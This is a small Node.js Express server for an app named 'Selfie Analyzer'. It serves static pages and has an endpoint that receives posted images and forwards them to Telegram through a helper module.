require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { sendPhotoToTelegram } = require('./lib/telegram');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ limit: '10mb', extended: true }));

app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/save-image', async (req, res) => {
    try {
        const { image } = req.body;
        if (!image) {
            return res.status(400).json({ error: 'No image data provided' });
        }

        const { caption } = await sendPhotoToTelegram(image);
        console.log('Image sent to Telegram:', caption);
        return res.status(200).json({ success: true, caption });
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return res.status(500).json({ error: error.message || 'Internal Server Error' });
    }
});

app.listen(PORT, () => {
    console.log(`Selfie Analyzer server running on http://localhost:${PORT}`);
});
